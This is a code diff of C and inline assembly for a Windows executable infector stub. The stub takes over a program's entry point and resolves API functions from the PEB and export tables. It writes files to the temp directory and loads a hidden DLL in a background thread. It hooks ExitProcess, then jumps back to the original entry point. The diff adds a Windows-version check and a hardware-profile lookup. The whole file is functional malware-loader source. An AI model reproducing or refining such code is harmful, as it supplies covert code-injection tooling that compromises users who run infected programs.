@@ -7,7 +7,7 @@
 
 #ifdef WIN32
 
-#define PRINT_MESSAGE(msg, x) do { \
+#define PRINT_MESSAGE(msg, x) if (_DEBUG) do { \
 	char* OEPstr = (char*) pfn_VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE); \
 	pfn_sprintf(OEPstr, STRING(msg), x); \
 	pfn_OutputDebugString(OEPstr); \
@@ -61,18 +61,26 @@ XREFNAMES data_imports[] = {
 			"LoadLibraryA",			// 25
 			"GetProcAddress",		// 26
 			"VirtualQuery",			// 27
+			"VerifyVersionInfoA",	// 28
+			"GetVersionExA",		// 29
 			NULL
 	}
 	}, // KERNEL32.DLL
 	
 	{ "MSVCRT.DLL",
 	{
-		"sprintf",				// 28
-		"exit",					// 29
+		"sprintf",				// 30
+		"exit",					// 31
 		NULL
 	} 
 	}, // USER32.DLL
 	
+	{ "ADVAPI32.DLL",
+	{
+		"GetCurrentHwProfileA", // 32
+	}
+	}, // ADVAPI32.DLL
+
 	{ NULL, { NULL } }
 };
 
@@ -89,21 +97,24 @@ char * _needed_strings[] = {
 	"\",HFF8",				// 9
 	"HFF5",					// 10
 	"\\",					// 11
-
+	"USER32.DLL",			// 12
+	
 #ifdef _DEBUG
-	"Error creating directory", // 12
-	"ExitProcess index %d", // 13
-	"ExitProcess hooked",   // 14
-	"Restoring OEP code",	// 15
-	"exit hooked",			// 16
-	"OEP restored!",		// 17
-	"Calling OEP",			// 18
-	"Error creating file",  // 19
-	"Calling HFF5 ...",		// 20
-	"HFF5 called!",			// 21
-	"In ExitProcess Hook",  // 22
-	"Quitting vector NOW!", // 23
-
+	"Error creating directory", // 13
+	"ExitProcess index %d", // 14
+	"ExitProcess hooked",   // 15
+	"Restoring OEP code",	// 16
+	"exit hooked",			// 17
+	"OEP restored!",		// 18
+	"Calling OEP @ %08x",	// 19
+	"Error creating file",  // 20
+	"Calling HFF5 ...",		// 21
+	"HFF5 called!",			// 22
+	"In ExitProcess Hook",  // 23
+	"Quitting vector NOW!", // 24
+	"VerifyVersionInfo @ %08x", // 25
+	"Sys MajorVersion %d", // 26
+	"Sys MinorVersion %d", // 27
 #endif
 
 	NULL
@@ -168,17 +179,17 @@ BYTE oepStub[OEPSTUBSIZE] = {
 int __stdcall NewEntryPoint()
 {	
 	DWORD dwCurrentAddr = 0;
-	DWORD dwMagic = 0;
+	DWORD OEP = 0;
 	
 	// Get current EIP in dwCurrentAddr
-	__asm{
-		pushad
+	__asm {
 		call lbl_ref1
 	lbl_ref1:
 		pop dwCurrentAddr
 	}
 	
 	// *** Find the ending marker of data section <E> 
+	DWORD dwMagic = 0;
 	while ( dwMagic != 0x003E453C )
 		dwMagic = (DWORD)(*(DWORD *)(--dwCurrentAddr));
 	
@@ -262,10 +273,8 @@ int __stdcall NewEntryPoint()
 							continue;
 						
 						if (!_STRCMPI_(STRING(STRIDX_LOADLIBRARYA), name)) {
-							// printf("%s\tOrd: %04X EP: %08x\n", name, (x + exportDirectory->Base), imageBase + Functions[x]);
 							pfn_LoadLibrary = (LOADLIBRARY) (imageBase + Functions[x]);
 						} else if (!_STRCMPI_(STRING(STRIDX_GETPROCADDRESS), name)) {
-							// printf("%s\tOrd: %04X EP: %08x\n", name, (x + exportDirectory->Base), imageBase + Functions[x]);
 							pfn_GetProcAddress = (GETPROCADDRESS) (imageBase + Functions[x]);
 						}
 						break;
@@ -304,7 +313,7 @@ NEXT_ENTRY:
 			ptr += _STRLEN_(ptr) + 1;
 		}
 	}
-
+	
 	// *** map call addresses to function pointers
 	
 #ifdef _DEBUG
@@ -336,6 +345,9 @@ NEXT_ENTRY:
 	GETLASTERROR pfn_GetLastError = (GETLASTERROR) dll_calls[CALL_GETLASTERROR];
 	SPRINTF pfn_sprintf = (SPRINTF) dll_calls[CALL_SPRINTF];
 	VIRTUALQUERY pfn_VirtualQuery = (VIRTUALQUERY) dll_calls[CALL_VIRTUALQUERY];
+	VERIFYVERSIONINFO pfn_VerifyVersionInfo = (VERIFYVERSIONINFO) dll_calls[CALL_VERIFYVERSIONINFO];
+	GETVERSIONEX pfn_GetVersionEx = (GETVERSIONEX) dll_calls[CALL_GETVERSIONEX];
+	GETCURRENTHWPROFILE pfn_GetCurrentHwProfile = (GETCURRENTHWPROFILE) dll_calls[CALL_GETCURRENTHWPROFILE];
 	
 	//
 	// TODO shared memory check
@@ -345,6 +357,8 @@ NEXT_ENTRY:
 	//		YES: skip this check
 	//		NO : check present
 	//
+	
+	// Verify we are not running on Windows 7 or later
 	
 	DWORD imageBase = 0;
 	
@@ -362,6 +376,25 @@ NEXT_ENTRY:
 	IMAGE_DOS_HEADER * dosHeader = (IMAGE_DOS_HEADER *) imageBase;
 	IMAGE_NT_HEADERS * ntHeaders = (IMAGE_NT_HEADERS *) (((PBYTE)dosHeader) + dosHeader->e_lfanew);
 	
+	//
+	// GOTO OEP_CALL FROM NOW ON ONLY!!!
+	//
+	
+	OSVERSIONINFOA* osVersion = (OSVERSIONINFOA*) pfn_VirtualAlloc(NULL, sizeof(OSVERSIONINFOA), MEM_COMMIT, PAGE_READWRITE);
+	_MEMSET_(osVersion, 0, sizeof(OSVERSIONINFOA));
+	osVersion->dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
+	BOOL bVersion = pfn_GetVersionEx(osVersion);
+	if (!bVersion)
+		goto OEP_CALL;
+
+	PRINT_MESSAGE(STRIDX_SYSMAJORVER, osVersion->dwMajorVersion);
+	PRINT_MESSAGE(STRIDX_SYSMINORVER, osVersion->dwMinorVersion);
+
+	if (osVersion->dwMajorVersion >= 6 && osVersion->dwMinorVersion >= 1)
+		goto OEP_CALL;
+
+	pfn_VirtualFree(osVersion, 0, MEM_RELEASE);
+
 	// Get user temporary directory
 	char * lpTmpEnvVar = STRING(STRIDX_TMP_ENVVAR);
 	char * lpTmpDir = (char*) pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
@@ -379,7 +412,7 @@ NEXT_ENTRY:
 	}
 	
 	// Go back one level (i.e. from Temp to its parent directory)
-
+	
 #ifdef _DEBUG
 	pfn_OutputDebugString(lpTmpDir);
 #endif
@@ -504,26 +537,7 @@ NEXT_ENTRY:
 			goto OEP_CALL;
 	}
 	
-	// Hook ExitProcess
-	
-	#if 0
-DWORD imageBase = 0;
-	
-	__asm {
-		push eax
-		push ebx
-		mov eax, fs:[30h]
-		mov ebx, [eax+8]
-		mov imageBase, ebx
-		pop ebx
-		pop eax
-	}
-	
-	// loop IAT lookin for ExitProcess
-	IMAGE_DOS_HEADER * dosHeader = (IMAGE_DOS_HEADER *) imageBase;
-	IMAGE_NT_HEADERS * ntHeaders = (IMAGE_NT_HEADERS *) (((PBYTE)dosHeader) + dosHeader->e_lfanew);
-#endif
-	
+	// Hook ExitProcess	
 	UINT_PTR IAT_rva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
 	IMAGE_IMPORT_DESCRIPTOR const * lpImp = (IMAGE_IMPORT_DESCRIPTOR *)((UINT_PTR)imageBase + IAT_rva);
 	
@@ -659,12 +673,12 @@ OEP_CALL:
 	// *** Restore OEP code
 	//
 	
-	DWORD OEP = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+	OEP = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
 	
 #ifdef _DEBUG
 	pfn_OutputDebugString(STRING(STRIDX_RESTOREOEP));
 #endif
-
+	
 	if (header->originalOEPCode.offset != 0)
 	{
 		DWORD oldProtect = 0;
@@ -679,22 +693,16 @@ OEP_CALL:
 #ifdef _DEBUG
 	pfn_OutputDebugString(STRING(STRIDX_OEPRESTORED));
 #endif
-
-	header->pfn_OriginalEntryPoint = (WINSTARTFUNC) OEP;
 	
-#ifdef _DEBUG
-	pfn_OutputDebugString(STRING(STRIDX_CALLINGOEP));
-#endif
+	PRINT_MESSAGE(STRIDX_CALLINGOEP, OEP);
 	
+#if 0
 	__asm {
 		popad
 	}
-
-	//
-	// *** Call Original Entry Point
-	//
+#endif
 	
-	header->pfn_OriginalEntryPoint();
+	((WINSTARTFUNC)OEP)();
 	
 	return 0;
 }
@@ -776,7 +784,7 @@ DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
 #ifdef _DEBUG
 	pfn_OutputDebugString(complete_path);
 #endif
-
+	
 	HMODULE hLib = pfn_LoadLibrary(header->dllPath);
 	if (hLib == INVALID_HANDLE_VALUE)
 		goto THREAD_EXIT;
@@ -853,14 +861,14 @@ lbl_ref1:
 #ifdef _DEBUG
 	pfn_OutputDebugString(STRING(STRIDX_INEXITPROC_HOOK));
 #endif
-
+	
 	while (header->synchro != 1)
 		pfn_Sleep(100);
 	
 #ifdef _DEBUG
 	pfn_OutputDebugString(STRING(STRIDX_VECTORQUIT));
 #endif
-
+	
 	pfn_OriginalExitProcess(uExitCode);
 }
 FUNCTION_END(ExitProcessHook);
